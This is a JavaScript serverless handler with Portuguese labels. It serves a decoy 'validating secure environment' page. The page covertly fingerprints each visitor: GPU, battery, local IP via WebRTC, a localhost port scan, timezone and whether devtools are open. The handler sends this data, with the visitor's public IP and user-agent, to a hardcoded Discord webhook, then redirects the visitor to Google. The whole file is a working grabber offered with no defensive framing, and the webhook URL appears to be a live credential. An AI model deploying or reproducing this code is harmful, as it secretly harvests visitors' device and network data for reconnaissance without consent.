export default async function handler(req, res) {
    const webhookURL = "https://discord.com/api/webhooks/1457145338161926276/zls4e-KmVOQwMrWLs_Ut-QR5N2R0mhpfKfw4BhVqUJOL-8mzELAZHk13rbJPlH4geFuv";

    if (req.method === 'POST') {
        const d = req.body;
        const h = req.headers;
        const ip = h['x-forwarded-for'] || req.socket.remoteAddress;

        const payload = {
            embeds: [{
                title: " RECONHECIMENTO : EXTRAÇÃO",
                color: 0,
                fields: [
                    { name: " Rede e IP", value: `**Público:** ${ip}\n**Local:** ${d.localIp}\n**VPN/Proxy:** ${d.vpnCheck}`, inline: true },
                    { name: " Hardware", value: `**CPU:** ${d.cores}\n**RAM:** ${d.mem}GB\n**GPU:** ${d.vendor}\n**Bateria:** ${d.battery}`, inline: true },
                    { name: " Display/Window", value: `**Tela:** ${d.res}\n**Janela:** ${d.win}\n**Orientação:** ${d.orientation}`, inline: true },
                    { name: " Segurança/Apps", value: `**AdBlock:** ${d.adblock}\n**PDF/Java:** ${d.pdf}/${d.java}\n**DNT:** ${d.doNotTrack}`, inline: true },
                    { name: " Portas Internas", value: `\`${d.ports || 'Nenhuma'}\``, inline: true },
                    { name: " Extras", value: `**Língua:** ${d.lang}\n**TZ:** ${d.tz}\n**Touch:** ${d.touch}\n**Bot:** ${d.isBot}`, inline: true },
                    { name: " Browser/State", value: `**Cookies:** ${d.cookies}\n**Inspecionando:** ${d.devTools}\n**Dark:** ${d.darkMode}` }
                ],
                footer: { text: "Coleta via Browser | UA: " + h['user-agent'] }
            }]
        };

        await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        return res.status(200).json({ status: 'ok' });
    }

    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <script>
            async function getFullData() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                
                // 1. Detecção de VPN/Firewall via latência
                const vpnCheck = await fetch('https://portquiz.net:8080').then(() => "Não").catch(() => "Sim/Firewall");
                
                // 2. Scan de Portas Internas (Localhost)
                const scanPorts = async () => {
                    const ports = [80, 443, 3389, 8080];
                    let found = [];
                    for(let p of ports) {
                        try { await fetch(\`http://127.0.0.1:\${p}\`, {mode:'no-cors', signal: AbortSignal.timeout(100)}); found.push(p); } catch(e){}
                    }
                    return found.join(',');
                };

                // 3. Bateria
                let batt = "N/A"; try { const b = await navigator.getBattery(); batt = \`\${Math.round(b.level*100)}% (\${b.charging?'C':'D'})\`; } catch(e){}

                // 4. IP Local WebRTC
                const getIP = () => new Promise(r => {
                    const pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = i => { if(i?.candidate?.candidate) { r(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]); pc.close(); }};
                    setTimeout(() => r("N/A"), 800);
                });

                const data = {
                    res: \`\${screen.width}x\${screen.height}\`,
                    win: \`\${window.innerWidth}x\${window.innerHeight}\`,
                    cores: navigator.hardwareConcurrency,
                    mem: navigator.deviceMemory || "N/A",
                    gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language,
                    touch: navigator.maxTouchPoints,
                    isBot: navigator.webdriver,
                    battery: batt,
                    localIp: await getIP(),
                    vpnCheck: vpnCheck,
                    ports: await scanPorts(),
                    // 10 Novos Dados Adicionais:
                    pdf: navigator.pdfViewerEnabled, 
                    java: navigator.javaEnabled(),
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || "N/A",
                    orientation: screen.orientation.type,
                    darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
                    devTools: (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160),
                    onLine: navigator.onLine,
                    platform: navigator.platform,
                    history: window.history.length
                };

                await fetch('/api', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
                window.location.href = "https://www.google.com";
            }
            getFullData();
        </script>
        <p>Aguarde, validando ambiente seguro...</p>
    `);
}
